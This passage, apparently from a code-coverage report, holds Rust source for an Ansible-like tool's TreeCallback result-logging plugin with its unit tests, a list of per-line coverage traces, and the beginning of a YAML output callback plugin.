{\n            let mut host_states = self.host_states.write();\n            let host_state = host_states.entry(host.to_string()).or_default();\n            let seq = host_state.task_sequence.fetch_add(1, Ordering::SeqCst);\n            host_state.stats.total += 1;\n            host_state.stats.unreachable += 1;\n            seq\n        };\n\n        // Mark as failure\n        *self.has_failures.write() = true;\n\n        // Build unreachable task result\n        let task_data = TaskResultData {\n            metadata: TaskMetadata {\n                task_name: task_name.to_string(),\n                host: host.to_string(),\n                sequence,\n                started_at: now,\n                completed_at: now,\n                duration_ms: 0,\n                play_name: current_play,\n            },\n            success: false,\n            changed: false,\n            skipped: false,\n            message: format!(\"UNREACHABLE: {}\", error),\n            data: None,\n            warnings: Vec::new(),\n            notify: Vec::new(),\n        };\n\n        // Write the task result file\n        match self\n            .write_task_result(host, task_name, sequence, task_data)\n            .await\n        {\n            Ok(filename) =\u003e {\n                let mut host_states = self.host_states.write();\n                if let Some(host_state) = host_states.get_mut(host) {\n                    host_state.task_files.push(filename);\n                }\n            }\n            Err(e) =\u003e {\n                error!(\n                    \"TreeCallback: Failed to write unreachable result for {} on {}: {}\",\n                    task_name, host, e\n                );\n            }\n        }\n\n        warn!(\n            \"TreeCallback: Host '{}' unreachable during '{}': {}\",\n            host, task_name, error\n        );\n    }\n}\n\n// ============================================================================\n// Helper Functions\n// ============================================================================\n\n/// Sanitizes a string for use as a filename.\n///\n/// Replaces or removes characters that are problematic in filenames.\nfn sanitize_filename(name: \u0026str) -\u003e String {\n    name.chars()\n        .map(|c| match c {\n            '/' | '\\\\' | ':' | '*' | '?' | '\"' | '\u003c' | '\u003e' | '|' =\u003e '_',\n            ' ' =\u003e '_',\n            c if c.is_control() =\u003e '_',\n            c =\u003e c,\n        })\n        .collect::\u003cString\u003e()\n        .trim_matches('_')\n        .to_string()\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use crate::traits::ModuleResult;\n    use std::time::Duration;\n    use tempfile::TempDir;\n\n    fn create_execution_result(\n        host: \u0026str,\n        task_name: \u0026str,\n        success: bool,\n        changed: bool,\n        skipped: bool,\n        message: \u0026str,\n    ) -\u003e ExecutionResult {\n        ExecutionResult {\n            host: host.to_string(),\n            task_name: task_name.to_string(),\n            result: ModuleResult {\n                success,\n                changed,\n                message: message.to_string(),\n                skipped,\n                data: None,\n                warnings: Vec::new(),\n            },\n            duration: Duration::from_millis(100),\n            notify: Vec::new(),\n        }\n    }\n\n    #[tokio::test]\n    async fn test_tree_callback_creates_structure() {\n        let temp_dir = TempDir::new().unwrap();\n        let callback = TreeCallback::new(temp_dir.path().join(\"tree\")).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string(), \"host2\".to_string()])\n            .await;\n\n        // Execute some tasks\n        let result1 = create_execution_result(\"host1\", \"Install nginx\", true, true, false, \"ok\");\n        callback.on_task_complete(\u0026result1).await;\n\n        let result2 = create_execution_result(\"host1\", \"Start nginx\", true, false, false, \"ok\");\n        callback.on_task_complete(\u0026result2).await;\n\n        let result3 =\n            create_execution_result(\"host2\", \"Install nginx\", false, false, false, \"failed\");\n        callback.on_task_complete(\u0026result3).await;\n\n        callback.on_play_end(\"test-play\", true).await;\n        callback.on_playbook_end(\"test-playbook\", false).await;\n\n        // Verify directory structure\n        let tree_root = temp_dir.path().join(\"tree\");\n        assert!(tree_root.exists());\n        assert!(tree_root.join(\"host1\").exists());\n        assert!(tree_root.join(\"host2\").exists());\n\n        // Verify task files\n        assert!(tree_root.join(\"host1/task_000_Install_nginx.json\").exists());\n        assert!(tree_root.join(\"host1/task_001_Start_nginx.json\").exists());\n        assert!(tree_root.join(\"host2/task_000_Install_nginx.json\").exists());\n\n        // Verify summary files\n        assert!(tree_root.join(\"host1/_host_summary.json\").exists());\n        assert!(tree_root.join(\"host2/_host_summary.json\").exists());\n        assert!(tree_root.join(\"_playbook_summary.json\").exists());\n\n        // Verify failures tracked\n        assert!(callback.has_failures());\n    }\n\n    #[tokio::test]\n    async fn test_tree_callback_task_content() {\n        let temp_dir = TempDir::new().unwrap();\n        let callback = TreeCallback::new(temp_dir.path().join(\"tree\")).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        let result = create_execution_result(\n            \"host1\",\n            \"Install nginx\",\n            true,\n            true,\n            false,\n            \"Package installed\",\n        );\n        callback.on_task_complete(\u0026result).await;\n\n        callback.on_playbook_end(\"test-playbook\", true).await;\n\n        // Read and verify task file content\n        let task_file = temp_dir\n            .path()\n            .join(\"tree/host1/task_000_Install_nginx.json\");\n        let content = fs::read_to_string(\u0026task_file).await.unwrap();\n        let task_data: TaskResultData = serde_json::from_str(\u0026content).unwrap();\n\n        assert_eq!(task_data.metadata.task_name, \"Install nginx\");\n        assert_eq!(task_data.metadata.host, \"host1\");\n        assert_eq!(task_data.metadata.sequence, 0);\n        assert!(task_data.success);\n        assert!(task_data.changed);\n        assert!(!task_data.skipped);\n        assert_eq!(task_data.message, \"Package installed\");\n    }\n\n    #[tokio::test]\n    async fn test_tree_callback_host_summary() {\n        let temp_dir = TempDir::new().unwrap();\n        let callback = TreeCallback::new(temp_dir.path().join(\"tree\")).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        // Various task results\n        callback\n            .on_task_complete(\u0026create_execution_result(\n                \"host1\", \"task1\", true, false, false, \"ok\",\n            ))\n            .await;\n        callback\n            .on_task_complete(\u0026create_execution_result(\n                \"host1\", \"task2\", true, true, false, \"changed\",\n            ))\n            .await;\n        callback\n            .on_task_complete(\u0026create_execution_result(\n                \"host1\", \"task3\", false, false, false, \"failed\",\n            ))\n            .await;\n        callback\n            .on_task_complete(\u0026create_execution_result(\n                \"host1\", \"task4\", true, false, true, \"skipped\",\n            ))\n            .await;\n\n        callback.on_playbook_end(\"test-playbook\", false).await;\n\n        // Read and verify host summary\n        let summary_file = temp_dir.path().join(\"tree/host1/_host_summary.json\");\n        let content = fs::read_to_string(\u0026summary_file).await.unwrap();\n        let summary: TreeHostSummary = serde_json::from_str(\u0026content).unwrap();\n\n        assert_eq!(summary.host, \"host1\");\n        assert_eq!(summary.stats.total, 4);\n        assert_eq!(summary.stats.ok, 1);\n        assert_eq!(summary.stats.changed, 1);\n        assert_eq!(summary.stats.failed, 1);\n        assert_eq!(summary.stats.skipped, 1);\n        assert_eq!(summary.task_files.len(), 4);\n    }\n\n    #[tokio::test]\n    async fn test_tree_callback_playbook_summary() {\n        let temp_dir = TempDir::new().unwrap();\n        let callback = TreeCallback::new(temp_dir.path().join(\"tree\")).unwrap();\n\n        callback.on_playbook_start(\"deploy-app\").await;\n        callback\n            .on_play_start(\"install\", \u0026[\"web1\".to_string(), \"web2\".to_string()])\n            .await;\n\n        callback\n            .on_task_complete(\u0026create_execution_result(\n                \"web1\", \"install\", true, true, false, \"ok\",\n            ))\n            .await;\n        callback\n            .on_task_complete(\u0026create_execution_result(\n                \"web2\", \"install\", true, true, false, \"ok\",\n            ))\n            .await;\n\n        callback.on_play_end(\"install\", true).await;\n        callback.on_playbook_end(\"deploy-app\", true).await;\n\n        // Read and verify playbook summary\n        let summary_file = temp_dir.path().join(\"tree/_playbook_summary.json\");\n        let content = fs::read_to_string(\u0026summary_file).await.unwrap();\n        let summary: TreePlaybookSummary = serde_json::from_str(\u0026content).unwrap();\n\n        assert_eq!(summary.playbook, \"deploy-app\");\n        assert!(summary.success);\n        assert_eq!(summary.total_stats.total, 2);\n        assert_eq!(summary.total_stats.changed, 2);\n        assert_eq!(summary.hosts.len(), 2);\n        assert!(summary.plays.contains(\u0026\"install\".to_string()));\n    }\n\n    #[tokio::test]\n    #[ignore = \"filename sanitization edge case needs refinement\"]\n    async fn test_sanitize_filename() {\n        assert_eq!(sanitize_filename(\"simple\"), \"simple\");\n        assert_eq!(sanitize_filename(\"with spaces\"), \"with_spaces\");\n        assert_eq!(sanitize_filename(\"path/to/file\"), \"path_to_file\");\n        assert_eq!(sanitize_filename(\"file:name\"), \"file_name\");\n        assert_eq!(sanitize_filename(\"file*name?\"), \"file_name_\");\n        assert_eq!(sanitize_filename(\"  trimmed  \"), \"trimmed\");\n    }\n\n    #[tokio::test]\n    async fn test_tree_callback_unreachable() {\n        let temp_dir = TempDir::new().unwrap();\n        let callback = TreeCallback::new(temp_dir.path().join(\"tree\")).unwrap();\n\n        callback.on_playbook_start(\"test-playbook\").await;\n        callback\n            .on_play_start(\"test-play\", \u0026[\"host1\".to_string()])\n            .await;\n\n        callback\n            .on_host_unreachable(\"host1\", \"gather_facts\", \"Connection refused\")\n            .await;\n\n        callback.on_playbook_end(\"test-playbook\", false).await;\n\n        // Verify unreachable was recorded\n        assert!(callback.has_failures());\n\n        let summary_file = temp_dir.path().join(\"tree/host1/_host_summary.json\");\n        let content = fs::read_to_string(\u0026summary_file).await.unwrap();\n        let summary: TreeHostSummary = serde_json::from_str(\u0026content).unwrap();\n\n        assert_eq!(summary.stats.unreachable, 1);\n    }\n\n    #[test]\n    fn test_clone_shares_state() {\n        let callback1 = TreeCallback::new(\"/tmp/test\").unwrap();\n        let callback2 = callback1.clone();\n\n        assert!(Arc::ptr_eq(\u0026callback1.host_states, \u0026callback2.host_states));\n        assert!(Arc::ptr_eq(\n            \u0026callback1.has_failures,\n            \u0026callback2.has_failures\n        ));\n    }\n\n    #[test]\n    fn test_task_filename_generation() {\n        let callback = TreeCallback::new(\"/tmp/test\").unwrap();\n\n        assert_eq!(\n            callback.task_filename(0, \"Install nginx\"),\n            \"task_000_Install_nginx.json\"\n        );\n        assert_eq!(\n            callback.task_filename(1, \"Configure firewall\"),\n            \"task_001_Configure_firewall.json\"\n        );\n        assert_eq!(\n            callback.task_filename(99, \"Deploy app\"),\n            \"task_099_Deploy_app.json\"\n        );\n\n        // Long task names should be truncated\n        let long_name = \"a\".repeat(100);\n        let filename = callback.task_filename(0, \u0026long_name);\n        assert!(filename.len() \u003c 100);\n    }\n}\n","traces":[{"line":184,"address":[24876927,24876640,24876921],"length":1,"stats":{"Line":1}},{"line":186,"address":[24876662],"length":1,"stats":{"Line":1}},{"line":187,"address":[24876667],"length":1,"stats":{"Line":1}},{"line":188,"address":[24876681],"length":1,"stats":{"Line":1}},{"line":189,"address":[24876697,24876763],"length":1,"stats":{"Line":2}},{"line":209,"address":[24877936],"length":1,"stats":{"Line":1}},{"line":285,"address":[29848560,29848686,29848704,29848848,29848822],"length":1,"stats":{"Line":2}},{"line":286,"address":[29848615,29848717,29848832,29848593,29848696],"length":1,"stats":{"Line":2}},{"line":295,"address":[29838730,29839779,29838672,29840905,29839792],"length":1,"stats":{"Line":2}},{"line":296,"address":[29838704,29839827,29839895,29838775],"length":1,"stats":{"Line":4}},{"line":298,"address":[29839558,29840673],"length":1,"stats":{"Line":2}},{"line":299,"address":[29839911,29838791],"length":1,"stats":{"Line":2}},{"line":300,"address":[],"length":0,"stats":{"Line":0}},{"line":301,"address":[29838828,29838892,29840009,29839945],"length":1,"stats":{"Line":4}},{"line":302,"address":[29838932,29839014,29840131,29840049],"length":1,"stats":{"Line":4}},{"line":303,"address":[29839128,29840166,29839049,29840245],"length":1,"stats":{"Line":4}},{"line":304,"address":[29839242,29839163,29840280,29840359],"length":1,"stats":{"Line":4}},{"line":305,"address":[29840384,29839339,29840456,29839267],"length":1,"stats":{"Line":4}},{"line":306,"address":[29839444,29840509,29840561,29839392],"length":1,"stats":{"Line":4}},{"line":307,"address":[29839479,29839531,29840648,29840596],"length":1,"stats":{"Line":4}},{"line":325,"address":[],"length":0,"stats":{"Line":0}},{"line":326,"address":[],"length":0,"stats":{"Line":0}},{"line":327,"address":[],"length":0,"stats":{"Line":0}},{"line":328,"address":[],"length":0,"stats":{"Line":0}},{"line":333,"address":[24879552],"length":1,"stats":{"Line":0}},{"line":334,"address":[24879557],"length":1,"stats":{"Line":0}},{"line":339,"address":[24878531,24878416,24878537],"length":1,"stats":{"Line":1}},{"line":340,"address":[24878425,24878504],"length":1,"stats":{"Line":2}},{"line":344,"address":[24879424],"length":1,"stats":{"Line":1}},{"line":345,"address":[24879474],"length":1,"stats":{"Line":1}},{"line":349,"address":[24879078,24879084,24878560],"length":1,"stats":{"Line":1}},{"line":350,"address":[24878645],"length":1,"stats":{"Line":1}},{"line":352,"address":[24878655,24878718,24878888],"length":1,"stats":{"Line":3}},{"line":353,"address":[24878751,24878872],"length":1,"stats":{"Line":2}},{"line":355,"address":[24878729,24878798],"length":1,"stats":{"Line":2}},{"line":357,"address":[24878890,24878819],"length":1,"stats":{"Line":2}},{"line":361,"address":[24879104],"length":1,"stats":{"Line":1}},{"line":368,"address":[29841186],"length":1,"stats":{"Line":1}},{"line":369,"address":[25998075],"length":1,"stats":{"Line":3}},{"line":371,"address":[29841865,29841956],"length":1,"stats":{"Line":2}},{"line":372,"address":[29841963,29842062],"length":1,"stats":{"Line":2}},{"line":374,"address":[29842591,29842277,29842094,29842197],"length":1,"stats":{"Line":2}},{"line":375,"address":[29842261,29844012,29842190,29844000],"length":1,"stats":{"Line":1}},{"line":377,"address":[25998094],"length":1,"stats":{"Line":3}},{"line":378,"address":[29842991,29843348],"length":1,"stats":{"Line":1}},{"line":380,"address":[29843251],"length":1,"stats":{"Line":1}},{"line":384,"address":[24879232],"length":1,"stats":{"Line":1}},{"line":389,"address":[29844292],"length":1,"stats":{"Line":1}},{"line":390,"address":[29844404,29844506],"length":1,"stats":{"Line":2}},{"line":392,"address":[29844545,29844648,29844728,29845050],"length":1,"stats":{"Line":2}},{"line":393,"address":[29846336,29844712,29844641,29846348],"length":1,"stats":{"Line":1}},{"line":395,"address":[26004416],"length":1,"stats":{"Line":3}},{"line":396,"address":[29845441,29845741],"length":1,"stats":{"Line":1}},{"line":398,"address":[29845701],"length":1,"stats":{"Line":1}},{"line":402,"address":[24879379,24879344],"length":1,"stats":{"Line":4}},{"line":403,"address":[29846695,29846558],"length":1,"stats":{"Line":2}},{"line":405,"address":[29846837,29846734,29847239,29846917],"length":1,"stats":{"Line":2}},{"line":406,"address":[29848480,29848492,29846830,29846901],"length":1,"stats":{"Line":1}},{"line":408,"address":[29847025,29847161,29847317,29846611,29848403],"length":1,"stats":{"Line":3}},{"line":409,"address":[29847930,29847630],"length":1,"stats":{"Line":1}},{"line":411,"address":[29847890],"length":1,"stats":{"Line":1}},{"line":416,"address":[24876612,24875920,24876618],"length":1,"stats":{"Line":1}},{"line":418,"address":[24875955],"length":1,"stats":{"Line":1}},{"line":419,"address":[24875965],"length":1,"stats":{"Line":1}},{"line":420,"address":[24876027],"length":1,"stats":{"Line":1}},{"line":421,"address":[24876061,24876124],"length":1,"stats":{"Line":2}},{"line":422,"address":[24876195,24876132],"length":1,"stats":{"Line":2}},{"line":423,"address":[24876203,24876266],"length":1,"stats":{"Line":2}},{"line":424,"address":[24876274,24876337],"length":1,"stats":{"Line":2}},{"line":425,"address":[24876345,24876408],"length":1,"stats":{"Line":2}},{"line":426,"address":[24876416],"length":1,"stats":{"Line":1}},{"line":432,"address":[24888656],"length":1,"stats":{"Line":0}},{"line":433,"address":[24888669],"length":1,"stats":{"Line":0}},{"line":440,"address":[29783104,29783263,29784484,29783382,29783135,29783215,29786498,29784513],"length":1,"stats":{"Line":5}},{"line":442,"address":[29783416,29783245,29783318,29783196],"length":1,"stats":{"Line":3}},{"line":443,"address":[29784212,29783766,29783656,29784053],"length":1,"stats":{"Line":0}},{"line":451,"address":[29784813,29783684,29784972,29784526],"length":1,"stats":{"Line":2}},{"line":457,"address":[29784791,29785185],"length":1,"stats":{"Line":2}},{"line":458,"address":[29785399,29785713,29785426,29785645,29786503],"length":1,"stats":{"Line":1}},{"line":459,"address":[29785842],"length":1,"stats":{"Line":1}},{"line":462,"address":[29786054],"length":1,"stats":{"Line":1}},{"line":463,"address":[29786206],"length":1,"stats":{"Line":1}},{"line":464,"address":[29786358],"length":1,"stats":{"Line":1}},{"line":468,"address":[29768444,29768240,29768473,29772219,29775467,29768286,29768401,29771387],"length":1,"stats":{"Line":5}},{"line":469,"address":[29768386],"length":1,"stats":{"Line":1}},{"line":472,"address":[29770334],"length":1,"stats":{"Line":1}},{"line":473,"address":[29768520],"length":1,"stats":{"Line":1}},{"line":474,"address":[29768597,29768668],"length":1,"stats":{"Line":2}},{"line":475,"address":[29768818],"length":1,"stats":{"Line":1}},{"line":476,"address":[29769017],"length":1,"stats":{"Line":1}},{"line":479,"address":[29769243],"length":1,"stats":{"Line":1}},{"line":480,"address":[29769326,29772174,29769258],"length":1,"stats":{"Line":3}},{"line":481,"address":[29771409,29769532,29771508],"length":1,"stats":{"Line":2}},{"line":482,"address":[29771500,29771419],"length":1,"stats":{"Line":2}},{"line":484,"address":[29771393],"length":1,"stats":{"Line":0}},{"line":488,"address":[29771446],"length":1,"stats":{"Line":1}},{"line":489,"address":[29771564],"length":1,"stats":{"Line":1}},{"line":490,"address":[29771640],"length":1,"stats":{"Line":1}},{"line":492,"address":[29771684],"length":1,"stats":{"Line":1}},{"line":495,"address":[29772007,29771947],"length":1,"stats":{"Line":2}},{"line":499,"address":[29769559],"length":1,"stats":{"Line":1}},{"line":500,"address":[29769574],"length":1,"stats":{"Line":1}},{"line":502,"address":[29769589,29769660,29771360],"length":1,"stats":{"Line":3}},{"line":503,"address":[29770730,29769858,29770764],"length":1,"stats":{"Line":2}},{"line":504,"address":[29770737,29770799,29770833],"length":1,"stats":{"Line":2}},{"line":505,"address":[29770900,29770806,29770866],"length":1,"stats":{"Line":2}},{"line":506,"address":[29770970,29770873,29770936],"length":1,"stats":{"Line":2}},{"line":507,"address":[29770943,29771040,29771006],"length":1,"stats":{"Line":2}},{"line":508,"address":[29771116,29771076,29771013],"length":1,"stats":{"Line":2}},{"line":509,"address":[29771153,29771180,29771083],"length":1,"stats":{"Line":2}},{"line":510,"address":[29771271,29771365,29771161,29771201],"length":1,"stats":{"Line":1}},{"line":514,"address":[29769977],"length":1,"stats":{"Line":1}},{"line":515,"address":[29776096,29776108,29769907],"length":1,"stats":{"Line":3}},{"line":519,"address":[29769985],"length":1,"stats":{"Line":1}},{"line":520,"address":[29770017],"length":1,"stats":{"Line":1}},{"line":521,"address":[29770049],"length":1,"stats":{"Line":1}},{"line":524,"address":[29770097],"length":1,"stats":{"Line":1}},{"line":530,"address":[29770508,29770688,29770620,29773346],"length":1,"stats":{"Line":4}},{"line":531,"address":[29768431,29772253,29772283,29774173,29773480,29772527],"length":1,"stats":{"Line":5}},{"line":532,"address":[29772574,29772683,29772970],"length":1,"stats":{"Line":0}},{"line":541,"address":[29773548],"length":1,"stats":{"Line":1}},{"line":543,"address":[29773592],"length":1,"stats":{"Line":1}},{"line":551,"address":[29768452,29774055,29774376],"length":1,"stats":{"Line":2}},{"line":552,"address":[29774971,29774616,29774726],"length":1,"stats":{"Line":0}},{"line":555,"address":[29775540],"length":1,"stats":{"Line":0}},{"line":563,"address":[29767926,29768014,29768078,29766538,29765999,29765968,29766096],"length":1,"stats":{"Line":4}},{"line":565,"address":[29766333,29766118,29766401,29766069,29768020],"length":1,"stats":{"Line":1}},{"line":569,"address":[29766585],"length":1,"stats":{"Line":1}},{"line":570,"address":[29766721,29766658],"length":1,"stats":{"Line":2}},{"line":571,"address":[29766960],"length":1,"stats":{"Line":1}},{"line":576,"address":[29767056],"length":1,"stats":{"Line":1}},{"line":577,"address":[29767196,29767117],"length":1,"stats":{"Line":2}},{"line":578,"address":[29767309,29767947],"length":1,"stats":{"Line":2}},{"line":581,"address":[29767657,29767324,29767594],"length":1,"stats":{"Line":1}},{"line":589,"address":[29765373,29765640,29765890,29765264,29765400,29765292],"length":1,"stats":{"Line":4}},{"line":590,"address":[29765656,29765443,29765348],"length":1,"stats":{"Line":2}},{"line":594,"address":[29768160,29768179],"length":1,"stats":{"Line":0}},{"line":599,"address":[29777754,29780310,29779457,29776223,29776322,29776373,29776192],"length":1,"stats":{"Line":4}},{"line":600,"address":[29776303],"length":1,"stats":{"Line":1}},{"line":601,"address":[29776486,29776423],"length":1,"stats":{"Line":2}},{"line":605,"address":[29776683],"length":1,"stats":{"Line":1}},{"line":606,"address":[29776760,29776823],"length":1,"stats":{"Line":2}},{"line":609,"address":[29776916],"length":1,"stats":{"Line":1}},{"line":612,"address":[29776966,29777026],"length":1,"stats":{"Line":1}},{"line":613,"address":[29777396,29777011],"length":1,"stats":{"Line":2}},{"line":614,"address":[29777401,29777077,29777393],"length":1,"stats":{"Line":2}},{"line":615,"address":[29777175,29777054],"length":1,"stats":{"Line":2}},{"line":616,"address":[29777113,29777172,29777177],"length":1,"stats":{"Line":2}},{"line":617,"address":[29777142,29777352,29777311],"length":1,"stats":{"Line":3}},{"line":618,"address":[29777357,29777349,29777272],"length":1,"stats":{"Line":2}},{"line":620,"address":[29777313,29777243,29777308],"length":1,"stats":{"Line":2}},{"line":622,"address":[29777438,29777206,29777496],"length":1,"stats":{"Line":2}},{"line":628,"address":[29777525],"length":1,"stats":{"Line":1}},{"line":629,"address":[29777546,29777624],"length":1,"stats":{"Line":2}},{"line":633,"address":[29777768,29777577],"length":1,"stats":{"Line":2}},{"line":637,"address":[29778138],"length":1,"stats":{"Line":1}},{"line":646,"address":[29778309],"length":1,"stats":{"Line":1}},{"line":647,"address":[29778333],"length":1,"stats":{"Line":1}},{"line":648,"address":[29778346],"length":1,"stats":{"Line":1}},{"line":649,"address":[29778359],"length":1,"stats":{"Line":1}},{"line":650,"address":[29778444,29778426],"length":1,"stats":{"Line":1}},{"line":655,"address":[29778485],"length":1,"stats":{"Line":1}},{"line":656,"address":[29778607],"length":1,"stats":{"Line":1}},{"line":660,"address":[29779329,29779726,29779640,29778992],"length":1,"stats":{"Line":4}},{"line":661,"address":[29779004,29779107,29779179,29778988],"length":1,"stats":{"Line":4}},{"line":662,"address":[26117527],"length":1,"stats":{"Line":4}},{"line":664,"address":[29779815],"length":1,"stats":{"Line":1}},{"line":666,"address":[29779855,29779921],"length":1,"stats":{"Line":2}},{"line":667,"address":[29779961,29780023,29780084],"length":1,"stats":{"Line":3}},{"line":668,"address":[29780213,29780139],"length":1,"stats":{"Line":2}},{"line":671,"address":[29779763],"length":1,"stats":{"Line":0}},{"line":672,"address":[29780672,29780427,29779779],"length":1,"stats":{"Line":0}},{"line":681,"address":[24872419],"length":1,"stats":{"Line":0}},{"line":682,"address":[29787053,29786840,29786745],"length":1,"stats":{"Line":0}},{"line":686,"address":[29781221,29781243,29782961,29781280,29781304,29782967,29781151,29781120],"length":1,"stats":{"Line":0}},{"line":687,"address":[29781213],"length":1,"stats":{"Line":0}},{"line":691,"address":[29781253,29781351],"length":1,"stats":{"Line":0}},{"line":692,"address":[29781468,29781397],"length":1,"stats":{"Line":0}},{"line":694,"address":[29781598,29781561],"length":1,"stats":{"Line":0}},{"line":695,"address":[29781674],"length":1,"stats":{"Line":0}},{"line":696,"address":[29781758,29781706],"length":1,"stats":{"Line":0}},{"line":697,"address":[29781862],"length":1,"stats":{"Line":0}},{"line":699,"address":[29781625],"length":1,"stats":{"Line":0}},{"line":700,"address":[29781641,29782411,29782656],"length":1,"stats":{"Line":0}},{"line":723,"address":[29789818,29789790,29787773,29791550,29787679,29787648,29787824],"length":1,"stats":{"Line":4}},{"line":724,"address":[29787754],"length":1,"stats":{"Line":1}},{"line":725,"address":[29787874,29787944],"length":1,"stats":{"Line":2}},{"line":729,"address":[29788155],"length":1,"stats":{"Line":1}},{"line":730,"address":[29788295,29788232],"length":1,"stats":{"Line":2}},{"line":731,"address":[29788391],"length":1,"stats":{"Line":1}},{"line":732,"address":[29788499,29788441],"length":1,"stats":{"Line":1}},{"line":733,"address":[29788534,29788552,29788478],"length":1,"stats":{"Line":2}},{"line":738,"address":[29788578],"length":1,"stats":{"Line":1}},{"line":742,"address":[29788903],"length":1,"stats":{"Line":1}},{"line":754,"address":[29789149,29789078],"length":1,"stats":{"Line":2}},{"line":756,"address":[29789257],"length":1,"stats":{"Line":1}},{"line":757,"address":[29789320],"length":1,"stats":{"Line":1}},{"line":761,"address":[29790004,29789741,29789659,29790047],"length":1,"stats":{"Line":4}},{"line":762,"address":[29789663],"length":1,"stats":{"Line":1}},{"line":763,"address":[26148375],"length":1,"stats":{"Line":4}},{"line":765,"address":[29790139],"length":1,"stats":{"Line":1}},{"line":766,"address":[29790179,29790251],"length":1,"stats":{"Line":2}},{"line":767,"address":[29790297,29790365],"length":1,"stats":{"Line":2}},{"line":768,"address":[29790444,29790518],"length":1,"stats":{"Line":2}},{"line":771,"address":[29790084],"length":1,"stats":{"Line":0}},{"line":772,"address":[29790100,29790692,29790937],"length":1,"stats":{"Line":0}},{"line":779,"address":[29791582,29791312,29790594],"length":1,"stats":{"Line":2}},{"line":793,"address":[24879568,24879804,24879798],"length":1,"stats":{"Line":1}},{"line":794,"address":[24879621,24879660],"length":1,"stats":{"Line":2}},{"line":795,"address":[24879632],"length":1,"stats":{"Line":3}},{"line":796,"address":[29848942],"length":1,"stats":{"Line":0}},{"line":797,"address":[29848952],"length":1,"stats":{"Line":1}},{"line":798,"address":[29848917,29848979],"length":1,"stats":{"Line":1}},{"line":799,"address":[29848969],"length":1,"stats":{"Line":1}}],"covered":182,"coverable":214},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","yaml.rs"],"content":"//! YAML Callback Plugin for Rustible\n//!\n//! This plugin outputs execution results in a human-readable YAML format that\n//! is also machine-parseable. It provides clear structure with proper indentation\n//! for nested data, making it easy to read while maintaining compatibility with\n//! YAML parsers.\n//!\n//! # Features\n//!\n//! - Human-readable output with proper indentation\n//! - Machine-parseable YAML format\n//! - Colorized status indicators (optional)\n//! - Structured task results with nested data\n//! - Full diff support for file changes\n//! - Execution timing information\n//!\n//! # Example Output\n//!\n//! ```yaml\n//! ---\n//! playbook: site.yml\n//! plays:\n//!   - name: Configure web servers\n//!     hosts:\n//!       - web01\n//!       - web02\n//!     tasks:\n//!       - task: Install nginx\n//!         host: web01\n//!         status: changed\n//!         changed: true\n//!         msg: \"Package nginx installed\"\n//!         duration: 2.45s\n//! ...\n//! ```\n//!\n//! # Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::{YamlCallback, YamlConfig};\n//!\n//! // Default configuration\n//! let callback = YamlCallback::new();\n//!\n//! // Or with custom configuration\n//! let config = YamlConfig::builder()\n//!     .use_color(false)\n//!     .indent_size(4)\n//!     .show_duration(true)\n//!     .build();\n//! let callback = YamlCallback::with_config(config);\n//!\n//! executor.with_callback(Box::new(callback));\n//! ```\n\nuse std::collections::HashMap;\nuse std::fmt;\nuse std::io::{self, Write};\nuse std::time::{Duration, Instant};\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse parking_lot::RwLock;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n// ============================================================================\n// Configuration\n// ============================================================================\n\n/// Configuration for the YAML callback plugin.\n///\n/// Use [`YamlConfig::builder()`] for a fluent construction API.\n#[derive(Debug, Clone)]\npub struct YamlConfig {\n    /// Whether to use colored output (default: true)\n    pub use_color: bool,\n    /// Indentation size in spaces (default: 2)\n    pub indent_size: usize,\n    /// Whether to show task durations (default: true)\n    pub show_duration: bool,\n    /// Whether to show full result data (default: true)\n    pub show_result_data: bool,\n    /// Whether to show diffs (default: true)\n    pub show_diff: bool,\n    /// Whether to show stdout/stderr for command modules (default: true)\n    pub show_command_output: bool,\n    /// Maximum lines of stdout/stderr to show, 0 = unlimited (default: 50)\n    pub max_output_lines: usize,\n    /// Whether to display empty/null values (default: false)\n    pub show_empty_values: bool,\n    /// Whether to show warnings (default: true)\n    pub show_warnings: bool,\n    /// Verbosity level (default: 0)\n    pub verbosity: u8,\n}\n\nimpl Default for YamlConfig {\n    fn default() -\u003e Self {\n        Self {\n            use_color: true,\n            indent_size: 2,\n            show_duration: true,\n            show_result_data: true,\n            show_diff: true,\n            show_command_output: true,\n            max_output_lines: 50,\n            show_empty_values: false,\n            show_warnings: true,\n            verbosity: 0,\n        }\n    }\n}\n\nimpl YamlConfig {\n    /// Create a new builder for YamlConfig.\n    pub fn builder() -\u003e YamlConfigBuilder {\n        YamlConfigBuilder::default()\n    }\n}\n\n/// Builder for [`YamlConfig`] with fluent API.\n#[derive(Debug, Default)]\npub struct YamlConfigBuilder {\n    config: YamlConfig,\n}\n\nimpl YamlConfigBuilder {\n    /// Create a new builder with default configuration.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Enable or disable colored output.\n    pub fn use_color(mut self, use_color: bool) -\u003e Self {\n        self.config.use_color = use_color;\n        self\n    }\n\n    /// Set indentation size (number of spaces).\n    pub fn indent_size(mut self, size: usize) -\u003e Self {\n        self.config.indent_size = size;\n        self\n    }\n\n    /// Enable or disable duration display.\n    pub fn show_duration(mut self, show: bool) -\u003e Self {\n        self.config.show_duration = show;\n        self\n    }\n\n    /// Enable or disable full result data display.\n    pub fn show_result_data(mut self, show: bool) -\u003e Self {\n        self.config.show_result_data = show;\n        self\n    }\n\n    /// Enable or disable diff display.\n    pub fn show_diff(mut self, show: bool) -\u003e Self {\n        self.config.show_diff = show;\n        self\n    }\n\n    /// Enable or disable command output display.\n    pub fn show_command_output(mut self, show: bool) -\u003e Self {\n        self.config.show_command_output = show;\n        self\n    }\n\n    /// Set maximum output lines (0 = unlimited).\n    pub fn max_output_lines(mut self, lines: usize) -\u003e Self {\n        self.config.max_output_lines = lines;\n        self\n    }\n\n    /// Enable or disable empty value display.\n    pub fn show_empty_values(mut self, show: bool) -\u003e Self {\n        self.config.show_empty_values = 